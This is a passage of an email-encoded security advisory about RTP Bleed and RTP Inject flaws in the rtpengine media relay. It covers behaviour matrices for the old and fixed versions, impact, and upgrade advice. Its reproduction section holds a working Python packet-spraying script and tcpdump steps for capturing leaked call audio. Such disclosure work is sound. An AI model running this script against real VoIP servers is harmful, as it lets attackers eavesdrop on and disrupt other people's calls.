.89%;">strict source&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Inject, Bleed | =
Inject, Bleed | No Inject or Bleed&nbsp; | Inject, Bleed |</span></span></d=
iv><div><span class=3D"font" style=3D"font-family:menlo, consolas, monospac=
e, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></span></s=
pan><br></div><div><span class=3D"font" style=3D"font-family:menlo, consola=
s, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"=
>The same behavior occurred whether rtpengine relayed plaintext RTP or SDES=
-SRTP. The heuristic flag did not prevent RTP Bleed or RTP Inject attacks, =
even when the correct IPs and ports are exchanged over SDP.</span></span></=
div><div><span class=3D"font" style=3D"font-family:menlo, consolas, monospa=
ce, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></span></=
span><br></div><div><span class=3D"font" style=3D"font-family:menlo, consol=
as, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;=
">With the updated version, rtpengine's heuristic behavior was changed so t=
hat the learning modes behave as expected, giving administrators the opport=
unity to mitigate these vulnerabilities while still handling NAT complexiti=
es.</span></span></div><div><span class=3D"font" style=3D"font-family:menlo=
, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size=
:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font-f=
amily:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;">The following is the same behavior matrix, but with =
the fixed version:</span></span></div><div><span class=3D"font" style=3D"fo=
nt-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" sty=
le=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D"font" =
style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=
=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p; | Delayed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Heuristic&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
 | No learning&nbsp;&nbsp; | Immediate&nbsp;&nbsp;&nbsp;&nbsp; |</span></sp=
an></div><div><span class=3D"font" style=3D"font-family:menlo, consolas, mo=
nospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">no s=
trict source&nbsp;&nbsp;&nbsp; | Inject, Bleed | Inject, &lt;5 packets Blee=
d | Inject only&nbsp;&nbsp; | Inject, Bleed |</span></span></div><div><span=
 class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif=
;"><span class=3D"size" style=3D"font-size:88.89%;">strict source&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp; | Inject, Bleed | &lt;5 packets Inject, &lt;5 pa=
ckets Bleed | No Inject or Bleed | Inject, Bleed |</span></span></div><div>=
<span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-=
serif;"><span class=3D"size" style=3D"font-size:88.89%;"></span></span><br>=
</div><div><span class=3D"font" style=3D"font-family:menlo, consolas, monos=
pace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">This me=
ans that with the updated version, the heuristic mode limits attacks to at =
most the first 5 packets for both injection and bleeding.</span></span></di=
v><div><span class=3D"font" style=3D"font-family:menlo, consolas, monospace=
, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">We believe =
that in many live environments, the recommended setup would be to use heuri=
stic learning with strict source, which keeps the flexibility of endpoint l=
earning while significantly mitigating RTP inject and RTP bleed attacks.</s=
pan></span></div><div><span class=3D"font" style=3D"font-family:menlo, cons=
olas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89=
%;"></span></span><br></div><div><span class=3D"font" style=3D"font-family:=
menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font=
-size:88.89%;">In the case of SDES-SRTP, we also recommend using heuristic =
learning mode with strict source, which keeps the flexibility of endpoint l=
earning while mitigating RTP inject and RTP bleed. However, for complete pr=
otection with SRTP, a patch specific to SRTP was introduced by adding a new=
 recrypt flag. This flag forces rtpengine to decrypt and then re-encrypt RT=
P packets, thus validating the authentication tag before any further proces=
sing. This ensures that unauthenticated packets are discarded. This new fla=
g should be used in addition to the previously recommended learning mode an=
d flag.</span></span></div><div><span class=3D"font" style=3D"font-family:m=
enlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-=
size:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"fo=
nt-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" sty=
le=3D"font-size:88.89%;">Patched version behavior matrix for SDES-SRTP, wit=
h and without recrypt:</span></span></div><div><span class=3D"font" style=
=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"siz=
e" style=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D"=
font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span c=
lass=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp; | Delayed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp; | Heuristic&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |=
 No-learning&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Immediate&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |</span></span></div><div><sp=
an class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-ser=
if;"><span class=3D"size" style=3D"font-size:88.89%;">Without recrypt&nbsp;=
&nbsp;&nbsp;&nbsp; | Inject, Bleed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Inject, =
&lt;5 packets Bleed | Inject only&nbsp;&nbsp; | Inject, Bleed&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp; |</span></span></div><div><span class=3D"font" style=3D"fo=
nt-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" sty=
le=3D"font-size:88.89%;">With recrypt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp; | No Inject or Bleed | No Inject or Bleed | No Inject or Bleed | No In=
ject or Bleed |</span></span></div><div><span class=3D"font" style=3D"font-=
family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D"font" st=
yle=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"=
size" style=3D"font-size:88.89%;">There is the special case of DTLS-SRTP, t=
ypically used for WebRTC environments, which was found vulnerable to RTP Bl=
eed but not RTP Inject. This was due to the logic applied in this case, whe=
re learning mode occurred before the RTP packets were properly validated. T=
his has also received a security fix.</span></span></div><div><span class=
=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><sp=
an class=3D"size" style=3D"font-size:88.89%;"></span></span><br></div><div>=
<span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-=
serif;"><span class=3D"size" style=3D"font-size:88.89%;">IMPACT</span></spa=
n></div><div><span class=3D"font" style=3D"font-family:menlo, consolas, mon=
ospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></spa=
n></span><br></div><div><span class=3D"font" style=3D"font-family:menlo, co=
nsolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.=
89%;">In the case of plaintext RTP, this vulnerability allows attackers to =
perform RTP Inject as well as RTP Bleed. RTP Inject affects the integrity o=
f the media while RTP Bleed affects the confidentiality of calls.&nbsp;</sp=
an></span></div><div><span class=3D"font" style=3D"font-family:menlo, conso=
las, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%=
;"></span></span><br></div><div><span class=3D"font" style=3D"font-family:m=
enlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-=
size:88.89%;">In cases where rtpengine is relaying plaintext RTP as well as=
 when it relays SRTP (in vulnerable versions), the vulnerabilities will cau=
se Denial of Service because the RTP packets will be sent to the attacker i=
nstead of the legitimate recipient.</span></span></div><div><span class=3D"=
font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span c=
lass=3D"size" style=3D"font-size:88.89%;"></span></span><br></div><div><spa=
n class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-seri=
f;"><span class=3D"size" style=3D"font-size:88.89%;">HOW TO REPRODUCE THE I=
SSUE</span></span></div><div><span class=3D"font" style=3D"font-family:menl=
o, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-siz=
e:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font-=
family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;">To reproduce this issue in a reliable manner, a secu=
rity tester needs three different parties each with their own IP address:</=
span></span></div><div><span class=3D"font" style=3D"font-family:menlo, con=
solas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.8=
9%;"></span></span><br></div><div><span class=3D"font" style=3D"font-family=
:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"fon=
t-size:88.89%;">1. Vulnerable rtpengine server</span></span></div><div><spa=
n class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-seri=
f;"><span class=3D"size" style=3D"font-size:88.89%;">2. An attacker node</s=
pan></span></div><div><span class=3D"font" style=3D"font-family:menlo, cons=
olas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89=
%;">3. A victim user node</span></span></div><div><span class=3D"font" styl=
e=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"si=
ze" style=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D=
"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span =
class=3D"size" style=3D"font-size:88.89%;">Steps:</span></span></div><div><=
span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-s=
erif;"><span class=3D"size" style=3D"font-size:88.89%;"></span></span><br><=
/div><div><span class=3D"font" style=3D"font-family:menlo, consolas, monosp=
ace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">1. Run t=
cpdump on the attacker node to monitor for incoming packets from the target=
:</span></span></div><div><span class=3D"font" style=3D"font-family:menlo, =
consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:8=
8.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font-fam=
ily:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"=
font-size:88.89%;">&nbsp;&nbsp;&nbsp; tcpdump -iany -w /tmp/rtpbleed.pcap s=
rc host &lt;target_ip&gt; and not icmp</span></span></div><div><span class=
=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><sp=
an class=3D"size" style=3D"font-size:88.89%;"></span></span><br></div><div>=
<span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-=
serif;"><span class=3D"size" style=3D"font-size:88.89%;">2. Save the follow=
ing Python script as sprayrtp.py:</span></span></div><div><span class=3D"fo=
nt" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span cla=
ss=3D"size" style=3D"font-size:88.89%;"></span></span><br></div><div><span =
class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;=
"><span class=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; impor=
t socket, argparse</span></span></div><div><span class=3D"font" style=3D"fo=
nt-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" sty=
le=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D"font" =
style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=
=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; parser =3D argpars=
e.ArgumentParser(description=3D"Spray simple RTP packets over a port range"=
)</span></span></div><div><span class=3D"font" style=3D"font-family:menlo, =
consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:8=
8.89%;">&nbsp;&nbsp;&nbsp; parser.add_argument("target", help=3D"Target IP =
address")</span></span></div><div><span class=3D"font" style=3D"font-family=
:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"fon=
t-size:88.89%;">&nbsp;&nbsp;&nbsp; parser.add_argument("start_port", type=
=3Dint, help=3D"First UDP port to spray")</span></span></div><div><span cla=
ss=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><=
span class=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; parser.a=
dd_argument("end_port",&nbsp;&nbsp; type=3Dint, help=3D"Last UDP port to sp=
ray")</span></span></div><div><span class=3D"font" style=3D"font-family:men=
lo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-si=
ze:88.89%;">&nbsp;&nbsp;&nbsp; args =3D parser.parse_args()</span></span></=
div><div><span class=3D"font" style=3D"font-family:menlo, consolas, monospa=
ce, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></span></=
span><br></div><div><span class=3D"font" style=3D"font-family:menlo, consol=
as, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;=
">&nbsp;&nbsp;&nbsp; rtppacket=3D[0x80, 0x0, 0xee, 0x3c, 0x4, 0x42, 0xa2, 0=
xc1, 0xef, 0xa, 0x7, 0xde]</span></span></div><div><span class=3D"font" sty=
le=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"s=
ize" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; rtppacket+=3D[0x0 for _=
 in range(160)]&nbsp;</span></span></div><div><span class=3D"font" style=3D=
"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" =
style=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D"fon=
t" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span clas=
s=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; sock =3D socket.s=
ocket(socket.AF_INET, socket.SOCK_DGRAM)</span></span></div><div><span clas=
s=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><s=
pan class=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; while Tru=
e:</span></span></div><div><span class=3D"font" style=3D"font-family:menlo,=
 consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:=
88.89%;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for port in range(args.=
start_port, args.end_port + 1):</span></span></div><div><span class=3D"font=
" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=
=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock.sendto(bytes(rtppacket), (args.target, p=
ort))</span></span></div><div><span class=3D"font" style=3D"font-family:men=
lo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-si=
ze:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font=
-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;">3. Run the script on the attacker node against the t=
arget:</span></span></div><div><span class=3D"font" style=3D"font-family:me=
nlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-s=
ize:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"fon=
t-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" styl=
e=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; python3 sprayrtp.py &lt;target_i=
p&gt; &lt;start_port&gt; &lt;end_port&gt;</span></span></div><div><span cla=
ss=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><=
span class=3D"size" style=3D"font-size:88.89%;"></span></span><br></div><di=
v><span class=3D"font" style=3D"font-family:menlo, consolas, monospace, san=
s-serif;"><span class=3D"size" style=3D"font-size:88.89%;">4. From the vict=
im user node, place a number of calls that make use of SRTP.</span></span><=
/div><div><span class=3D"font" style=3D"font-family:menlo, consolas, monosp=
ace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></span><=
/span><br></div><div><span class=3D"font" style=3D"font-family:menlo, conso=
las, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%=
;">5. Observe that tcpdump on the attacker node will show incoming packets =
from the vulnerable target.</span></span></div><div><span class=3D"font" st=
yle=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"=
size" style=3D"font-size:88.89%;"></span></span><br></div><div><span class=
=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><sp=
an class=3D"size" style=3D"font-size:88.89%;">Note: a SIP signaling server =
such as Kamailio or OpenSIPS is usually part of the setup as well.</span></=
span></div><div><span class=3D"font" style=3D"font-family:menlo, consolas, =
monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></=
span></span><br></div><div><span class=3D"font" style=3D"font-family:menlo,=
 consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:=
88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font-fa=
mily:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D=
"font-size:88.89%;">SOLUTIONS AND RECOMMENDATIONS</span></span></div><div><=
span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-s=
erif;"><span class=3D"size" style=3D"font-size:88.89%;"></span></span><br><=
/div><div><span class=3D"font" style=3D"font-family:menlo, consolas, monosp=
ace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">It is re=
commended to upgrade to a fixed version, and to either disable learning ent=
irely or use the heuristic learning mode in conjunction with the strict sou=
rce flag. When using SDES-SRTP, it is recommended to use both strict source=
 and recrypt flags for complete protection. While fixes for the heuristic m=
ode were backported to earlier versions, the new recrypt flag is only avail=
able in the latest version. In the case of DTLS-SRTP, a fix was made so tha=
t SRTP validation occurs before learning mode. We highly recommend upgradin=
g to access these security features.</span></span></div><div><span class=3D=
"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span =
class=3D"size" style=3D"font-size:88.89%;"></span></span><br></div><div><sp=
an class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-ser=
if;"><span class=3D"size" style=3D"font-size:88.89%;">The first version tha=
t includes the fixes is available at&nbsp;</span></span><a href=3D"https://=
github.com/sipwise/rtpengine/releases/tag/mr13.4.1.1"><span class=3D"font" =
style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=
=3D"size" style=3D"font-size:88.89%;">https://github.com/sipwise/rtpengine/=
releases/tag/mr13.4.1.1</span></span></a><span class=3D"font" style=3D"font=
-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;">.</span></span></div><div><span class=3D"font" style=
=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"siz=
e" style=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D"=
font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span c=
lass=3D"size" style=3D"font-size:88.89%;">ABOUT ENABLE SECURITY</span></spa=
n></div><div><span class=3D"font" style=3D"font-family:menlo, consolas, mon=
ospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></spa=
n></span><br></div><div><span class=3D"font" style=3D"font-family:menlo, co=
nsolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.=
89%;">Enable Security (</span></span><a href=3D"https://www.enablesecurity.=
com"><span class=3D"font" style=3D"font-family:menlo, consolas, monospace, =
sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">https://www.e=
nablesecurity.com</span></span></a><span class=3D"font" style=3D"font-famil=
y:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"fo=
nt-size:88.89%;">) provides quality penetration testing to help protect you=
r real-time communications systems against attack.</span></span></div><div>=
<span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-=
serif;"><span class=3D"size" style=3D"font-size:88.89%;"></span></span><br>=
</div><div><span class=3D"font" style=3D"font-family:menlo, consolas, monos=
pace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">DISCLAI=
MER</span></span></div><div><span class=3D"font" style=3D"font-family:menlo=
, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size=
:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font-f=
amily:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;">The information in the advisory is believed to be ac=
curate at the time of publishing based on currently available information. =
Use of the information constitutes acceptance for use in an AS IS condition=
. There are no warranties with regard to this information. Neither the auth=
or nor the publisher accepts any liability for any direct, indirect, or con=
sequential loss or damage arising from use of, or reliance on, this informa=
tion.</span></span></div><div><span class=3D"font" style=3D"font-family:men=
lo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-si=
ze:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font=
-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;">DISCLOSURE POLICY</span></span></div><div><span clas=
s=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><s=
pan class=3D"size" style=3D"font-size:88.89%;"></span></span><br></div><div=
><span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans=
-serif;"><span class=3D"size" style=3D"font-size:88.89%;">This report is su=
bject to Enable Security's vulnerability disclosure policy which can be fou=
nd at&nbsp;</span></span><a href=3D"https://github.com/EnableSecurity/Vulne=
rability-Disclosure-Policy"><span class=3D"font" style=3D"font-family:menlo=
, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size=
:88.89%;">https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy=
</span></span></a><span class=3D"font" style=3D"font-family:menlo, consolas=
, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">=
.</span></span></div><div><br></div></body></html>=

--d56d2e04d9dd4028b63cb2b4303402b7--
